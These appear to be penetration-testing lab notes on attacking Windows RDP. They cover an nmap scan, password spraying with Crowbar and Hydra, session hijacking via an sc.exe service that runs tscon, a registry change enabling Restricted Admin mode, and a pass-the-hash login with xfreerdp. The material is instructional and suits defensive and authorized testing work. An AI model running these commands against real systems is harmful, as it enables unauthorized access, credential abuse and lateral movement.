## Remote Desktop Protocol (RDP)

RDP is Microsoft's proprietary protocol providing graphical remote computer access over networks. It's widely used by system administrators for centralized remote management and by MSPs to manage multiple customer networks. However, RDP also creates an attack vector.

**Default Port:** TCP/3389

### Identify RDP Service

```shell-session
# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

## RDP Misconfigurations

### Password Guessing Attacks

RDP authentication via credentials makes it vulnerable to password guessing. Rarely, misconfigurations may leave RDP without password protection.

### Password Spraying Technique

**Caution:** Consider the client's password policy - accounts often lock after multiple failed attempts.

**Password Spraying:** Attempts one password across many usernames before trying the next password, avoiding account lockouts by limiting attempts per account.

Using the `Crowbar` tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator : password123` on the target RDP host.

```
# cat usernames.txt 

root
test
user
guest
admin
administrator

# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

We can also use `Hydra` to perform an RDP password spray attack:

`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

We can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.


## RDP Protocol Specific Attacks

### RDP Session Hijacking

With local administrator privileges on a compromised machine, you can hijack active RDP sessions to impersonate other users and escalate privileges (potentially to Domain Admin in AD environments).

**Requirements:**
- SYSTEM privileges
- Target user's SESSION ID

**Method:**

1. **Identify sessions:**
```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

2. **Create service (runs as SYSTEM by default):**
```cmd-session
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

3. **Start service:**
```cmd-session
C:\htb> net start sessionhijack
```

A new terminal opens with the hijacked user's session, allowing privilege discovery and potential lateral movement.

**Note:** This method doesn't work on Server 2019.

**Alternative escalation methods:** PsExec, Mimikatz

## RDP Pass-the-Hash (PtH)

Access GUI applications via RDP using only NT hashes (without plaintext passwords) from credential dumps.

### Requirements

**Restricted Admin Mode** must be enabled on the target (disabled by default).

**Enable via Registry:**
```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Execute PtH Attack

```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Notes

- Not guaranteed to work on all Windows systems
- Useful when you have NTLM hashes and the user has RDP access
- Beneficial when GUI access aids assessment objectives
- Worth attempting whenever conditions align
